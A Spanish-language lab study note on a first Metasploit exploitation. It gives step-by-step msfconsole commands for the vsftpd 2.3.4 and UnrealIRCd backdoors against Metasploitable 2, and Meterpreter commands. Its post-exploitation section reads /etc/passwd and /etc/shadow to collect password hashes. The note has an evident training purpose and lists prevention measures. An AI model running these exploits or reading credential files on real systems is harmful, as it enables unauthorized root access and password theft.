# Lección 05: Primera explotación controlada con Metasploit

> Solo en mi laboratorio (Metasploitable 2, Red NAT aislada). Nunca fuera de un
> entorno propio o autorizado por escrito.

## Qué es Metasploit
Plataforma con miles de exploits ya programados, sus payloads y herramientas para
gestionar las conexiones conseguidas. Se controla con `msfconsole`.

## Vocabulario
| Término | Significado |
|---|---|
| Módulo | Pieza de Metasploit (exploit, payload, auxiliar...) |
| Exploit | Aprovecha una vulnerabilidad concreta |
| Payload | Lo que se ejecuta tras explotar (una shell) |
| RHOSTS / RPORT | IP / puerto del objetivo |
| LHOST | Mi propia IP (para payloads que "llaman a casa") |
| Sesión | Conexión activa conseguida |

## Flujo de trabajo (siempre el mismo)
```
sudo msfconsole
search nombre_software
use ruta/del/modulo
options
set RHOSTS IP
exploit
```

## Ejemplo 1: vsftpd 2.3.4 (CVE-2011-2523)
```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.2.3
exploit
```
No requiere elegir payload: la puerta trasera abre una shell directamente.
Causa: código malicioso insertado en el código fuente oficial; un usuario FTP con
`:)` abre una shell de root en el puerto 6200.

## Ejemplo 2: UnrealIRCd
```
search unrealircd
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.0.2.3
exploit
```

## Un problema real que me salió: el payload se queda "pegado"
`msfconsole` conserva el último `PAYLOAD` configurado **durante toda la sesión**, aunque
cambies de módulo con `use`. Si antes probaste otro payload (por ejemplo uno de Windows o
Meterpreter), el exploit puede pedirte `LHOST` aunque el módulo no lo necesite por defecto.

Dos formas de solucionarlo:
```
unset payload
use exploit/unix/ftp/vsftpd_234_backdoor
```
o, más rápido, rellenar lo que pide:
```
set LHOST TU_IP_DE_KALI
```
Con `LHOST` puesto, el exploit se lanza igualmente, aunque el payload activo sea uno de
tipo Meterpreter (ver siguiente sección).

## Confirmar acceso
Si el payload es una shell simple (`cmd/unix/interact`):
```bash
whoami
id
hostname
```
Si sale `root` / `uid=0`, hay control total del sistema sin usar contraseña.

### Si en vez de una shell obtienes Meterpreter
A veces el exploit abre una **sesión de Meterpreter** en lugar de una shell normal
(prompt `meterpreter >`). Es un payload más avanzado, con su propia consola:

| Comando | Qué hace |
|---|---|
| `help` | Lista los comandos |
| `sysinfo` | Información del sistema |
| `getuid` | Equivalente a `whoami` |
| `shell` | Te mete en una shell real del sistema (ahí sí funcionan `whoami`, `id`, `hostname`) |
| `background` | Deja la sesión abierta y vuelves a `msf6 >` |
| `sessions -l` / `sessions -i N` | Listar / volver a entrar en una sesión |
| `exit` | Cierra la sesión actual |

## Post-explotación: qué se hace con el acceso
No basta con entrar; en una auditoría real se demuestra el impacto:
```bash
cat /etc/passwd    # lista de usuarios del sistema
cat /etc/shadow    # hashes de contraseñas (solo legible por root)
```
Estos hashes son el punto de partida para la siguiente lección (cracking de contraseñas).
También se puede mirar `ip a` dentro de la shell para ver si hay otra red interna
alcanzable solo desde esta máquina (pivoting), aunque eso lo veremos más adelante.

## Cómo se previene
- Descargar software de fuentes oficiales y verificar checksums.
- Mantener todo actualizado y parcheado.
- Monitorizar conexiones salientes inusuales (IDS/SIEM).
- No exponer servicios innecesarios.
- Principio de mínimo privilegio: que los servicios no corran como root sin necesidad.

## Qué he aprendido
Entendí la diferencia entre buscar un exploit con `searchsploit` (hay que adaptarlo a
mano) y usar Metasploit, que automatiza configurar y lanzar el ataque con `set` y
`exploit`. Vi el flujo que se repite siempre: buscar el módulo, usarlo, configurar
`RHOSTS` y lanzar. Practiqué con la puerta trasera de vsftpd 2.3.4, que da acceso de
root sin ninguna contraseña, y entendí por qué: un código malicioso insertado en el
software original. Me encontré con que `msfconsole` guarda variables entre módulos
durante la sesión, lo que puede dar errores confusos (`LHOST` pedido sin motivo
aparente), y aprendí a resolverlo con `unset payload` o rellenando lo que pide.
También conocí Meterpreter, una sesión más avanzada que una shell simple, con sus
propios comandos (`getuid`, `sysinfo`, `shell`). Y, sobre todo, entendí qué significa
demostrar impacto: no basta con entrar, hay que mostrar hasta dónde se puede llegar,
como leer los hashes de todas las contraseñas del sistema.

Detalle completo de la explotación real en
[writeups/explotacion-vsftpd-metasploitable.md](../writeups/explotacion-vsftpd-metasploitable.md).
